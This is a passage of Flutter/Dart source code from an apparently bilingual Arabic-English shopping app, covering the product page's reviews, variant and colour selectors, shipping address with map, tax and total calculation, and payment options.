                                style: ts_Regular(sy(s), fc_4),
                              ),
                            ],
                          ),
                        ),
                        SizedBox(
                          width: sy(5),
                        ),
                        RatingWidget(
                          ratings: reviewList[i]['star'].toString(),
                          color: Colors.amber,
                          size: sy(n + 1),
                        ),
                      ],
                    ),
                    SizedBox(
                      height: sy(5),
                    ),
                    Row(
                      children: [
                        SizedBox(
                          width: sy(35),
                        ),
                        Expanded(
                          child: TranslationWidget(
                              message: reviewList[i]['comments'],
                              style: ts_Regular(sy(n), fc_3)),
                        )
                      ],
                    ),
                    SizedBox(
                      height: sy(8),
                    ),
                    if (i != reviewList.length - 1) divLine(sy(8), 0),
                  ],
                ),
              ),
            ),
          if (reviewList.length == 0)
            emptyWidget(
                Lang("No Reviews found  ", " لم يتم العثور على مراجعات ")),
        ],
      ),
    );
  }

  writeReviewWidget() {
    return Container(
      padding: EdgeInsets.fromLTRB(sy(0), sy(0), sy(0), sy(10)),
      width: Width(context),
      child: Container(
        decoration:
            decoration_round(Colors.grey[100], sy(5), sy(5), sy(5), sy(5)),
        padding: EdgeInsets.fromLTRB(sy(10), sy(10), sy(10), sy(5)),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.start,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              Lang(" Write your review ", "اكتب مراجعتك  "),
              style: ts_Bold(sy(l), Colors.grey[700]),
            ),
            SizedBox(
              height: sy(10),
            ),
            Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              mainAxisAlignment: MainAxisAlignment.start,
              children: [
                GestureDetector(
                  child: Icon(
                    getIcons(1),
                    color: TheamPrimary,
                    size: sy(25),
                  ),
                  onTap: () {
                    setStarForReview(1);
                  },
                ),
                GestureDetector(
                  child: Icon(
                    getIcons(2),
                    color: TheamPrimary,
                    size: sy(25),
                  ),
                  onTap: () {
                    setStarForReview(2);
                  },
                ),
                GestureDetector(
                  child: Icon(
                    getIcons(3),
                    color: TheamPrimary,
                    size: sy(25),
                  ),
                  onTap: () {
                    setStarForReview(3);
                  },
                ),
                GestureDetector(
                  child: Icon(
                    getIcons(4),
                    color: TheamPrimary,
                    size: sy(25),
                  ),
                  onTap: () {
                    setStarForReview(4);
                  },
                ),
                GestureDetector(
                  child: Icon(
                    getIcons(5),
                    color: TheamPrimary,
                    size: sy(25),
                  ),
                  onTap: () {
                    setStarForReview(5);
                  },
                )
              ],
            ),
            SizedBox(
              height: sy(10),
            ),
            SizedBox(
              height: sy(15),
            ),
            Container(
                height: sy(60),
                decoration: decoration_border(Colors.white, Colors.grey[500],
                    sy(1), sy(5), sy(5), sy(5), sy(5)),
                padding: EdgeInsets.fromLTRB(sy(10), sy(0), sy(10), sy(0)),
                child: TextField(
                  controller: ETreview,
                  keyboardType: TextInputType.multiline,
                  maxLines: 10,
                  textAlign: TextAlign.left,
                  decoration: InputDecoration(
                      // counter: Offstage(),
                      hintText: Lang(" Your review ", " مراجعتك "),
                      hintStyle: ts_Regular(sy(l), Colors.grey[500]),
                      focusedBorder: InputBorder.none,
                      enabledBorder: InputBorder.none,
                      border: InputBorder.none,
                      isDense: false),
                  style: ts_Regular(sy(l), Colors.grey[700]),
                  textInputAction: TextInputAction.newline,
                  autofocus: false,
                )),
            SizedBox(
              height: sy(10),
            ),
            ElevatedButton(
                style: ElevatedButton.styleFrom(
                  primary: TheamPrimary,
                  shape: RoundedRectangleBorder(
                    borderRadius: BorderRadius.circular(sy(5)),
                  ),
                ),
                onPressed: () {
                  if (Pstar != 0 && ETreview.text != "") {
                    _addReview();
                  } else {
                    Pop.errorTop(
                        context,
                        Lang(" Please add starts and review ",
                            " الرجاء إضافة البدايات والمراجعة "),
                        Icons.warning);
                  }
                  FocusScope.of(context).unfocus();
                },
                child: Text(
                  Lang("Add Review  ", " إضافة مراجعة "),
                  style: ts_Regular(sy(n), Colors.white),
                )),
            SizedBox(
              height: sy(10),
            ),
          ],
        ),
      ),
    );
  }

  getIcons(int getrate) {
    if (Pstar >= getrate) {
      return Icons.star;
    } else {
      return Icons.star_border;
    }
  }

  setStarForReview(int rateing) {
    setState(() {
      Pstar = rateing;
    });
  }

  emptyWidget(String lable) {
    return Container(
      width: Width(context),
      child: Column(
        children: [
          SizedBox(
            height: sy(5),
          ),
          Image.asset(
            'assets/images/emptyimg.png',
            width: Width(context) * 0.3,
          ),
          SizedBox(
            height: sy(2),
          ),
          Text(
            lable,
            style: ts_Regular(sy(s), fc_4),
          ),
          SizedBox(
            height: sy(5),
          ),
        ],
      ),
    );
  }

  titleCard(String lable) {
    return Container(
      padding: EdgeInsets.fromLTRB(sy(10), sy(10), sy(10), sy(7)),
      child: Text(
        lable,
        style: ts_Bold(sy(n), fc_3),
      ),
    );
  }

  divLine(double top, double bottom) {
    return Container(
      color: Colors.grey.shade200,
      width: Width(context),
      height: sy(1),
      margin: EdgeInsets.fromLTRB(sy(0), top, sy(0), bottom),
    );
  }

  cardMoreDetail(String qes, String ans) {
    return Container(
        alignment: Alignment.center,
        padding: EdgeInsets.fromLTRB(sy(5), sy(3), sy(5), sy(3)),
        decoration: decoration_border(
            fc_bg, fc_bg, 0.0, sy(15), sy(15), sy(15), sy(15)),
        child: Column(
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.start,
              children: [
                Icon(
                  Icons.double_arrow,
                  size: sy(l - 1),
                  color: fc_4,
                ),
                SizedBox(
                  width: sy(8),
                ),
                Text(
                  qes.toString(),
                  style: ts_Regular(sy(n - 1), fc_3),
                ),
                Spacer(),
                TranslationWidget(
                  message: ans.toString(),
                  style: ts_Regular(sy(n - 1), fc_2),
                ),
              ],
            ),
          ],
        ));
  }

  detailWidget() {
    return Container(
      margin: EdgeInsets.fromLTRB(sy(10), sy(3), sy(10), sy(3)),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.start,
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          TranslationWidget(
            message: productDetail[0]['p_detail'],
            textAlign: TextAlign.justify,
            style: ts_Regular(sy(n), fc_2),
          ),
        ],
      ),
    );
  }

  relatedWidget() {
    return Container(
      margin: EdgeInsets.fromLTRB(sy(5), sy(3), sy(5), sy(3)),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.start,
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          for (int i = 0; i < relatedList.length; i++)
            Container(
              margin: EdgeInsets.fromLTRB(sy(5), sy(2), sy(5), sy(4)),
              child: ElevatedButton(
                onPressed: () {
                  Navigator.push(
                      context,
                      OpenScreen(
                          widget: ProductViewScreen(
                        pid: relatedList[i]["p_id"],
                        pname: relatedList[i]["p_title"],
                        pimage: relatedList[i]["p_image"],
                      )));
                },
                style: elevatedButtonTrans(),
                child: ProductCard(i: i, getProducts: relatedList),
              ),
            ),
        ],
      ),
    );
  }

  cartWidget() {
    return Container(
        width: Width(context),
        height: Height(context),
        color: fc_bg,
        child: Column(
          children: [
            Container(
              padding: EdgeInsets.fromLTRB(sy(10), sy(3), sy(10), sy(3)),
              child: Row(
                mainAxisAlignment: MainAxisAlignment.start,
                children: [
                  Expanded(
                      child: Text(
                    Lang(" Confirm Purchase ", "تأكيد الشراء  "),
                    style: ts_Regular(sy(n), fc_1),
                  )),
                  IconButton(
                      onPressed: () {
                        setState(() {
                          buyPressed = false;
                        });
                      },
                      icon: Icon(
                        Icons.clear,
                        size: sy(xl),
                        color: fc_3,
                      )),
                ],
              ),
            ),
            divLine(sy(1), sy(3)),
            Expanded(
                child: Container(
              width: Width(context),
              padding: EdgeInsets.fromLTRB(sy(10), sy(3), sy(10), sy(3)),
              child: SingleChildScrollView(
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.start,
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    CustomeImageView(
                      image: Urls.imageLocation + widget.pimage,
                      width: Width(context),
                      height: Width(context) * .5,
                      radius: sy(10),
                      fit: BoxFit.cover,
                    ),
                    SizedBox(
                      height: sy(10),
                    ),
                    TranslationWidget(
                      message: widget.pname,
                      style: ts_Bold(sy(l), fc_2),
                    ),
                    SizedBox(
                      height: sy(5),
                    ),
                    divLine(sy(3), sy(10)),
                    Row(
                      mainAxisAlignment: MainAxisAlignment.start,
                      children: [
                        Column(
                          mainAxisAlignment: MainAxisAlignment.start,
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              PriceUtils.convert(
                                  (selectedSellPrice * quantity).toString()),
                              style: ts_Regular(sy(n), TheamPrimary),
                            ),
                            SizedBox(
                              height: sy(3),
                            ),
                            Text(
                              productDetail[0]['p_quantity'] +
                                  ' ' +
                                  productDetail[0]['p_unit$cur_Lang'],
                              style: ts_Regular(sy(s), fc_4),
                            ),
                          ],
                        ),
                        Spacer(),
                        Container(
                          padding:
                              EdgeInsets.fromLTRB(sy(3), sy(4), sy(3), sy(4)),
                          decoration: decoration_border(
                              TheamPrimary,
                              Colors.grey.shade500,
                              1,
                              sy(5),
                              sy(5),
                              sy(5),
                              sy(5)),
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            crossAxisAlignment: CrossAxisAlignment.center,
                            children: [
                              GestureDetector(
                                child: Icon(
                                  Icons.remove,
                                  size: sy(l),
                                  color: fc_bg,
                                ),
                                onTap: () {
                                  setState(() {
                                    if (quantity > 1) {
                                      quantity = quantity - 1;
                                    } else {
                                      buyPressed = false;
                                    }
                                  });
                                },
                                behavior: HitTestBehavior.translucent,
                              ),
                              Container(
                                padding: EdgeInsets.fromLTRB(
                                    sy(8), sy(0), sy(8), sy(0)),
                                child: Text(
                                  quantity.toString(),
                                  style: ts_Bold(sy(n), fc_bg),
                                ),
                              ),
                              GestureDetector(
                                behavior: HitTestBehavior.translucent,
                                child: Icon(
                                  Icons.add,
                                  size: sy(l),
                                  color: fc_bg,
                                ),
                                onTap: () {
                                  setState(() {
                                    if (productDetail[0]['p_multi_quantity']
                                            .toString() ==
                                        '1') {
                                      quantity = quantity + 1;
                                    } else {
                                      Pop.errorTop(
                                          context,
                                          Lang(" This is single quantity item ",
                                              " هذا عنصر كمية واحدة"),
                                          Icons.warning);
                                    }
                                  });
                                },
                              ),
                            ],
                          ),
                        ),
                      ],
                    ),
                    divLine(sy(10), sy(10)),
                    addressBlock(),
                    SizedBox(
                      height: sy(20),
                    ),
                    cardDouble(Lang("Price  ", " سعر "),
                        PriceUtils.convert(selectedSellPrice.toString())),
                    cardDouble(Lang("Quantity  ", "كمية  "),
                        quantity.toString() + ' ' + Lang('items', 'العناصر')),
                    cardDouble(Lang("Tax (5%)  ", " الضريبة (5٪) "),
                        '+ ' + PriceUtils.convert(getTax().toString())),
                    SizedBox(
                      height: sy(3),
                    ),
                    cardDouble(Lang(" TOTAL PRICE ", " السعر الكلي "),
                        PriceUtils.convert(getTotal().toString())),
                    SizedBox(
                      height: sy(50),
                    ),
                  ],
                ),
              ),
            )),
            divLine(sy(1), sy(0)),
            Container(
              // color: Colors.grey.shade100,
              padding: EdgeInsets.fromLTRB(sy(15), sy(3), sy(10), sy(3)),
              child: Column(
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.start,
                    children: [
                      Text(
                        PriceUtils.convert(getTotal()),
                        style: ts_Bold(sy(l), TheamPrimary),
                      ),
                      Spacer(),
                      // SizedBox(
                      //   width: sy(15),
                      // ),
                      SizedBox(
                        width: 20,
                      ),
                      Expanded(
                        child: ApplePayButtonWidget(
                          amount: getTotal().toString(),
                          onSuccess: () {
                            log('success');
                            setState(() {
                              _booking(
                                'PAID',
                                DateTime.now()
                                    .millisecondsSinceEpoch
                                    .toString(),
                              );
                            });
                          },
                          onFailed: () {
                            setState(() {
                              //_PreBooking('PAID${invoiceId.toString()}');
                              //_booking('Failed', invoiceId.toString());
                              Pop.errorTop(
                                  context, 'Payment Failed', Icons.warning);
                            });
                          },
                        ),
                      ),
                      SizedBox(
                        height: 35,
                        child: ElevatedButton(
                          onPressed: () {
                            // apiTest(ETaddress.text.toString());
                            _popPayOption();
                          },
                          style: elevatedButton(TheamPrimary, sy(5)),
                          child: Container(
                            padding: EdgeInsets.fromLTRB(
                                sy(15), sy(5), sy(10), sy(5)),
                            child: Text(
                              Lang(" Buy Now ", " اشتري الآن "),
                              style: ts_Regular(sy(n), fc_bg),
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ],
        ));
  }

  cardDouble(String qes, String ans) {
    return Container(
      width: Width(context),
      padding: EdgeInsets.fromLTRB(sy(5), sy(3), sy(5), sy(3)),
      child: Row(
        children: [
          Expanded(
            child: Text(
              qes,
              style: ts_Regular(sy(n), fc_2),
            ),
          ),
          Text(
            ans,
            style: ts_Regular(sy(n), fc_2),
          )
        ],
      ),
    );
  }

  tabbutton(IconData icon, String name) {
    return Container(
      alignment: Alignment.center,
      padding: EdgeInsets.fromLTRB(sy(10), sy(6), sy(15), sy(6)),
      margin: EdgeInsets.fromLTRB(sy(5), sy(5), sy(5), sy(5)),
      decoration: decoration_round(fc_6, sy(10), sy(10), sy(10), sy(10)),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(
            icon,
            size: sy(l),
            color: fc_2,
          ),
          SizedBox(
            width: sy(8),
          ),
          Text(
            name,
            style: ts_Regular(sy(n), fc_2),
          ),
        ],
      ),
    );
  }

  paymentSuccess() {
    return Container(
      width: MediaQuery.of(context).size.width,
      height: MediaQuery.of(context).size.height,
      color: fc_bg,
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [
          Image.asset(
            'assets/images/shopping2.png',
            width: MediaQuery.of(context).size.width * 0.7,
          ),
          SizedBox(
            height: sy(20),
          ),
          Text(
            Lang('Shopping completed', "اكتمل التسوق"),
            style: ts_Regular(sy(l), TheamPrimary),
          ),
          SizedBox(
            height: sy(2),
          ),
          Text(
            Lang('We will update your order as soon as possible',
                "سنقوم بتحديث طلبك في أقرب وقت ممكن"),
            style: ts_Regular(sy(n), TheamPrimary),
          ),
          SizedBox(
            height: sy(10),
          ),
          Container(
            width: MediaQuery.of(context).size.width,
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      primary: TheamBG,
                      shape: RoundedRectangleBorder(
                          side: BorderSide(
                              color: fc_4!, width: 1, style: BorderStyle.solid),
                          borderRadius: BorderRadius.circular(5)),
                    ),
                    onPressed: () {
                      Navigator.pushReplacement(
                          context, OpenScreen(widget: UserBookingScreen()));
                    },
                    child: Container(
                      alignment: Alignment.center,
                      padding:
                          EdgeInsets.fromLTRB(sy(10), sy(5), sy(10), sy(5)),
                      child: Text(
                        Lang('View Orders', 'عرض الطلبات'),
                        style: ts_Regular(sy(n), TheamPrimary),
                      ),
                    )),
                SizedBox(
                  width: sy(10),
                ),
                ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      primary: TheamBG,
                      shape: RoundedRectangleBorder(
                          side: BorderSide(
                              color: fc_4!, width: 1, style: BorderStyle.solid),
                          borderRadius: BorderRadius.circular(5)),
                    ),
                    onPressed: () {
                      //  Navigator.pushReplacement(context, OpenScreen(widget: CartScreen(stage: 1,bagview: bagview,)));

                      Navigator.of(context).pop();
                    },
                    child: Container(
                      alignment: Alignment.center,
                      padding:
                          EdgeInsets.fromLTRB(sy(10), sy(5), sy(10), sy(5)),
                      child: Text(
                        Lang('Done', 'تم'),
                        style: ts_Regular(sy(n), TheamPrimary),
                      ),
                    )),
              ],
            ),
          )
        ],
      ),
    );
  }

  variantBlockNew() {
    return Container(
      width: Width(context),
      padding: EdgeInsets.fromLTRB(sy(10), sy(0), sy(5), sy(0)),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.start,
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Wrap(
            spacing: sy(8),
            runSpacing: sy(8),
            alignment: WrapAlignment.start,
            children: [
              for (int i = 0; i < productVariant.length; i++)
                Container(
                  child: Column(
                    children: [
                      GestureDetector(
                        onTap: () {
                          setState(() {
                            if (productVariant[i]['s_qty'].toString() == '0') {
                              Pop.errorTop(
                                  context,
                                  Lang('Out of stock', "غير متوفر بالمخرن"),
                                  Icons.shopping_cart);
                            } else {
                              selectedVariant =
                                  productVariant[i]['ps_id'].toString();
                              selectedSellPrice = double.parse(
                                  productVariant[i]['sell'].toString());
                            }
                          });
                        },
                        child: ConstrainedBox(
                          constraints: new BoxConstraints(
                            minWidth: sy(33),
                          ),
                          child: Container(
                            padding:
                                EdgeInsets.fromLTRB(sy(8), sy(5), sy(8), sy(5)),
                            decoration: decoration_border(
                                (selectedVariant ==
                                        productVariant[i]['ps_id'].toString())
                                    ? TheamPrimary
                                    : (productVariant[i]['s_qty'].toString() ==
                                            '0')
                                        ? Colors.grey[100]
                                        : Colors.transparent,
                                (productVariant[i]['s_qty'].toString() == '0')
                                    ? Colors.grey[100]
                                    : Colors.grey[400],
                                1,
                                sy(4),
                                sy(4),
                                sy(4),
                                sy(4)),
                            child: TranslationWidget(
                              message: productVariant[i]['name'],
                              style: ts_Regular(
                                  sy(s),
                                  (selectedVariant ==
                                          productVariant[i]['ps_id'].toString())
                                      ? Colors.white
                                      : Colors.black),
                              textAlign: TextAlign.center,
                            ),
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
            ],
          )
        ],
      ),
    );
  }

  colorBlockNew() {
    return Container(
      padding: EdgeInsets.fromLTRB(sy(10), sy(5), sy(5), sy(0)),
      width: MediaQuery.of(context).size.width,
      child: Column(
        mainAxisAlignment: MainAxisAlignment.start,
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          SizedBox(
            height: sy(10),
          ),
          Wrap(
            spacing: sy(8),
            runSpacing: sy(8),
            alignment: WrapAlignment.center,
            children: [
              for (int i = 0; i < productColor.length; i++)
                GestureDetector(
                  onTap: () {
                    setState(() {
                      selectedColor = productColor[i]['pv_id'].toString();
                    });
                  },
                  child: Container(
                    height: sy(20),
                    width: sy(20),
                    decoration: decoration_border(
                        Color(int.parse("0xFF" + productColor[i]['color'])),
                        (selectedColor == productColor[i]['pv_id'].toString())
                            ? TheamPrimary
                            : (productColor[i]['color']
                                        .toString()
                                        .toLowerCase() ==
                                    'ffffff')
                                ? Colors.grey[600]
                                : Colors.transparent,
                        (selectedColor == productColor[i]['pv_id'].toString())
                            ? 4
                            : (productColor[i]['color']
                                        .toString()
                                        .toLowerCase() ==
                                    'ffffff')
                                ? 1
                                : 4,
                        sy(5),
                        sy(5),
                        sy(5),
                        sy(5)),
                  ),
                ),
            ],
          ),
          SizedBox(
            height: sy(0),
          ),
        ],
      ),
    );
  }

  addressBlock() {
    return Container(
      width: MediaQuery.of(context).size.width,
      padding: EdgeInsets.fromLTRB(sy(10), sy(10), sy(10), sy(5)),
      decoration:
          decoration_round(Colors.grey[100], sy(10), sy(10), sy(10), sy(10)),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.start,
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.start,
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Expanded(
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.start,
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      Lang("Shipping Address  ", "عنوان الشحن  "),
                      style: ts_Bold(sy(n), fc_2),
                    ),
                    SizedBox(
                      height: sy(5),
                    ),
                    Container(
                      height: sy(35),
                      decoration: decoration_round(
                          Colors.grey[100], sy(5), sy(5), sy(5), sy(5)),
                      margin: EdgeInsets.fromLTRB(sy(0), sy(3), sy(0), sy(0)),
                      child: TextField(
                        controller: ETaddress,
                        keyboardType: TextInputType.multiline,
                        textAlign: TextAlign.left,
                        maxLines: 15,
                        decoration: InputDecoration(
                            contentPadding:
                                EdgeInsets.fromLTRB(sy(0), sy(0), sy(0), sy(0)),
                            border: InputBorder.none,
                            isDense: true),
                        style: ts_Regular(sy(s), fc_3),
                      ),
                    ),
                    SizedBox(
                      height: sy(5),
                    ),
                    GestureDetector(
                        onTap: () {
                          _openMap();
                        },
                        child: Container(
                          padding:
                              EdgeInsets.fromLTRB(sy(0), sy(3), sy(0), sy(3)),
                          child: Text(
                            Lang(" Change Address ", " تغيير العنوان "),
                            style: ts_Regular(sy(n), Colors.blue),
                          ),
                        )),
                  ],
                ),
              ),
              Container(
                  width: Width(context) * 0.3,
                  height: Width(context) * 0.25,
                  margin: EdgeInsets.fromLTRB(sy(2), sy(5), sy(2), sy(5)),
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(sy(5)),
                    child: GoogleMap(
                      mapType: MapType.normal,
                      zoomControlsEnabled: false,
                      markers: <Marker>[
                        Marker(
                            markerId: MarkerId("Point"),
                            position: LatLng(double.parse(mapLat.toString()),
                                double.parse(mapLng.toString())),
                            icon: BitmapDescriptor.defaultMarker,
                            infoWindow: InfoWindow(title: "Point")),
                      ].toSet(),
                      initialCameraPosition: CameraPosition(
                        target: LatLng(double.parse(mapLat.toString()),
                            double.parse(mapLng.toString())),
                        zoom: 15.0,
                      ),
                      onMapCreated: (GoogleMapController controller) {
                        _Mapcontroller = controller;
                      },
                    ),
                  )),
            ],
          ),
          SizedBox(
            height: sy(5),
          ),
          Text(
            Lang(
                " Please Note. Some products may not delivered to selected address. You can confirm your order once that particular shop accept your order ",
                " يرجى الملاحظة. قد لا يتم تسليم بعض المنتجات إلى العنوان المحدد. يمكنك تأكيد طلبك بمجرد قبول هذا المتجر المحدد لطلبك "),
            style: ts_Regular(sy(s), Colors.grey.shade500),
          ),
          SizedBox(
            height: sy(5),
          )
        ],
      ),
    );
  }

  getTax() {
    double pTax = 0;
    pTax = (selectedSellPrice / 100) * 5;
    return pTax.toStringAsFixed(2);
  }

  getTotal() {
    double pTotal = 0;
    pTotal = double.parse(getTax()) + selectedSellPrice;
    return pTotal.toStringAsFixed(2);
  }

  _popPayOption() {
    return showModalBottomSheet(
        context: context,
        builder: (BuildContext bc) {
          return Container(
            child: Wrap(
              children: <Widget>[
                titleCard(Lang("Payment Options  ", " خيارات الدفع ")),
                SizedBox(
                  height: sy(5),
                  width: Width(context),
                ),
                ListTile(
                    leading: Icon(
                      Icons.language,
                      size: sy(l),
                      color: fc_2,
                    ),
                    title: Text(
                      Lang(" Pay Online ", "الدفع عبر الإنترنت  "),
                      style: ts_Regular(sy(n), fc_2),
                    ),
                    onTap: () {
                      // TapPaymentHelper.instance.setupSDKSession(
                      //   amount: double.tryParse(getTotal().toString()) ?? 0.0,
                      // );
                      // return;
                      /* Navigator.pop(context);
                      Navigator.of(context)
                          .push(
                        MaterialPageRoute(
                          builder: (context) => TapPaymentScreen(
                            amount: selectedSellPrice,
                            onSuccess: (value) {
                              log('value => $value');
                              String id = value['id'].toString();
                              _booking(
                                'PAID',
                                id,
                              );
                            },
                            onFailed: (value) {
                              Pop.errorTop(
                                  context, 'Payment Failed', Icons.warning);
                              log('errorValue => $value');
                            },
                          ),
                        ),
                      )
                          .then((value) {
                        // Navigator.pop(context);
                      });*/
                      /*mfHelper.initialPayment(
                          amount: double.parse(getTotal()),
                          context: context,
                          onPaymentResponse: (invoiceId, result) => {
                                if (result.isSuccess())
                                  {
                                    setState(() {
                                      print("invoiceId: " + invoiceId);
                                      print("Response: " +
                                          result.response!.toJson().toString());
                                      _response = result.response!
                                          .toJson()
                                          .toString()
                                          .toString();
                                      _booking('PAID', invoiceId.toString());
                                    })
                                  }
                                else
                                  {
                                    setState(() {
                                      print("invoiceId: " + invoiceId);
                                      print("Response: " +
                                          result.error!.toJson().toString());
                                      _response = result.error!.message!;
                                      //_PreBooking('PAID${invoiceId.toString()}');
                                      //_booking('Failed', invoiceId.toString());
                                      Pop.errorTop(context, 'Payment Failed',
                                          Icons.warning);
                                    })
                                  }
                              });

                      // mfHelper.showPaymentMethodsSheet(
                      //     amount: selectedSellPrice,
                      //     context: context,
                      //     onPaymentResponse: (invoiceId, result) => {
                      //           if (result.isSuccess())
                      //             {
                      //               setState(() {
                      //                 print("invoiceId: " + invoiceId);
                      //                 print("Response: " +
                      //                     result.response!.toJson().toString());
                      //                 _response = result.response!
                      //                     .toJson()
                      //                     .toString()
                      //                     .toString();
                      //                 _booking('PAID', invoiceId.toString());
                      //               })
                      //             }
                      //           else
                      //             {
                      //               setState(() {
                      //                 print("invoiceId: " + invoiceId);
                      //                 print("Response: " +
                      //                     result.error!.toJson().toString());
                      //                 _response = result.error!.message!;
                      //                 //_PreBooking('PAID${invoiceId.toString()}');
                      //                 //_booking('Failed', invoiceId.toString());
                      //                 Pop.errorTop(context, 'Payment Failed',
                      //                     Icons.warning);
                      //               })
                      //             }
                      //         });
                  */
                      // FlutterPaytabsHelper().payWithCard(
                      //   amount: double.parse(getTotal()),
                      //   context: context,
                      // );
                      Navigator.pop(context);

                      TapPaymentHelper.instance.setupSDKSession(
                        amount: double.parse(getTotal()),
                        settings:
                            Provider.of<AppSetting>(context, listen: false),
                        onSuccess: (invoiceId) {
                          setState(() {
                            print("invoiceId: " + invoiceId);
                            // _response =
                            //     // result.response!.toJson().toString().toString();
                            _booking('PAID', invoiceId.toString());
                          });
                        },
                        onFailed: () {
                          setState(() {
                            // print("invoiceId: " + invoiceId);
                            // print("Response: " +
                            //_PreBooking('PAID${invoiceId.toString()}');
                            //_booking('Failed', invoiceId.toString());
                            Pop.errorTop(
                                context,
                                Lang("Payment Failed ", "عملية الدفع فشلت "),
                                Icons.warning);
                          });
                        },
                      );
                    }),
                ListTile(
                    leading: Icon(
                      Icons.wallet_travel,
                      size: sy(l),
                      color: fc_2,
                    ),
                    title: Text(
                      Lang(" Cash On Delivery ", " الدفع نقدا عند الاستلام "),
                      style: ts_Regular(sy(n), fc_2),
                    ),
                    onTap: () => {
                          _booking('COD', 'COD'),
                          Navigator.pop(context),
                        }),
              ],
            ),
          );
        });
  }

  Future _openMap() async {
    var location = Location();
    bool _serviceEnabled = await location.serviceEnabled();
    if (!_serviceEnabled) {
      _serviceEnabled = await location.requestService();
      if (!_serviceEnabled) {
        return;
      }
    }
    PermissionStatus _permissionGranted = await location.hasPermission();
    if (_permissionGranted == PermissionStatus.denied) {
      _permissionGranted = await location.requestPermission();
      if (_permissionGranted != PermissionStatus.granted) {
        return;
      } else {
        _openMap();
      }
    } else {
      Map results = Map();
      try {
        results = await Navigator.of(context)
            .push(MaterialPageRoute(builder: (context) => MapScreen()));
        ;
        if (results != null) {
          setState(() {
            mapAddress = results['address'].toString();
            mapLat = results['lat'].toString();
            mapLng = results['long'].toString();
            mapCity = results['city'].toString();

            SharedStoreUtils.setValue(
                Const.MAPADDRESS, results['address'].toString());
            SharedStoreUtils.setValue(Const.MAPLAT, results['lat'].toString());
            SharedStoreUtils.setValue(Const.MAPLNG, results['long'].toString());
            SharedStoreUtils.setValue(
                Const.MAPCITY, results['city'].toString());

            Provider.of<AppSetting>(context, listen: false).mapAddress =
                mapAddress;
            Provider.of<AppSetting>(context, listen: false).maplat = mapLat;
            Provider.of<AppSetting>(context, listen: false).maplon = mapLng;
            Provider.of<AppSetting>(context, listen: false).mapCity = mapCity;
          });
        }
      } catch (e) {
        print('cancel');
      }
    }
  }
}

class TopTitleBar extends SliverPersistentHeaderDelegate with RelativeScale {
  final String productImage;
  final String productName;

  final BuildContext bcontext;
  final double? expandedHeight;
  final double itemHeight = 200;
  final Widget shareBtn;
  final Widget backBtn;
  final Widget favBtn;
  final List productImages;
  final List productDetail;

  TopTitleBar(
      {required this.productImage,
      required this.productName,
      required this.shareBtn,
      required this.backBtn,
      required this.favBtn,
      required this.productImages,
      required this.productDetail,
      required this.bcontext,
      this.expandedHeight});

  @override
  Widget build(
      BuildContext context, double shrinkOffset, bool overlapsContent) {
    initRelativeScaler(context);
    return Container(
      width: Width(context),
      height: expandedHeight,
      color: Colors.white,
      child: Stack(
        fit: StackFit.expand,
        // overflow: Overflow.visible,
        children: [
          Positioned(
            child: bannerImage(context),
            top: MediaQuery.of(context).padding.top,
            left: 0,
            right: 0,
            bottom: 0,
          ),
          Positioned(
            top: MediaQuery.of(context).padding.top,
            left: 0,
            right: 0,
            child: Center(
              child: Container(
                width: MediaQuery.of(context).size.width,
                height: sy(40),
                padding: EdgeInsets.fromLTRB(sy(10), sy(5), sy(5), sy(5)),
                child: Row(
                  children: [
                    backBtn,
                    Expanded(
                      child: SizedBox(
                        width: sy(10),
                      ),
                    ),
                    if (productDetail.length != 0)
                      GestureDetector(
                        behavior: HitTestBehavior.translucent,
                        onTap: () {
                          //Navigator.of(context).pop(true);
                          // Navigator.of(context, rootNavigator: true).pop(context);
                        },
                        child: Material(
                          color: Colors.black12,
                          elevation: 1,
                          borderRadius: BorderRadius.circular(sy(30)),
                          child: Container(
                              alignment: Alignment.center,
                              padding: EdgeInsets.fromLTRB(
                                  sy(10), sy(0), sy(10), sy(0)),
                              child: Row(
                                children: [
                                  Icon(
                                    Icons.place,
                                    color: fc_bg,
                                    size: sy(n),
                                  ),
                                  SizedBox(
                                    width: sy(5),
                                  ),
                                  TranslationWidget(
                                    message:
                                        productDetail[0]['p_city'].toString(),
                                    style: ts_Regular(sy(s), fc_bg),
                                  )
                                ],
                              )),
                        ),
                      ),
                  ],
                ),
              ),
            ),
          ),
          if (productDetail.length != 0)
            Positioned(
              left: sy(10),
              right: sy(10),
              bottom: sy(10),
              child: Container(
                width: Width(context),
                height: sy(45),
                padding: EdgeInsets.fromLTRB(sy(10), sy(5), sy(8), sy(5)),
                decoration: decoration_border(
                    fc_bg, fc_bg, 0.0, sy(10), sy(10), sy(10), sy(10)),
                //   alignment: Alignment.center,
                child: Row(
                  children: [
                    GestureDetector(
                      onTap: () {
                        Navigator.push(
                            bcontext,
